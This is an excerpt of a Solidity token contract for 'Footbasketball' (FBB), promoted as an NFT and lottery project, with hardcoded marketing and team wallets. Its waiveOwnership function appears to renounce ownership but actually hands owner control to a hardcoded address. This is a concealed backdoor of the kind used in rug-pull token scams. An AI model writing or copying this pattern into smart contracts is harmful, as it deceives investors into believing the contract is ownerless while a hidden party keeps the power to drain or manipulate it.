...
/**
  ✅FootBasketball is an NFT application and lottery project,
   it will make the investors happy with various activities,
    and it will always focus on the future with football and basketball games, 
    which are the most popular sports in the global world.🏀⚽️

https://t.me/footbasketballbsc
https://footbasketball.online
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x27D703C235942e6298c246373f67f7e750552e12);
    }
...
contract Footbasketball is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Footbasketball";
    string private _symbol = "FBB";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x08e9295EF0Bb939c3e28856C670f9b336E878B42);
    address payable public teamWalletAddress = payable(0x08e9295EF0Bb939c3e28856C670f9b336E878B42);
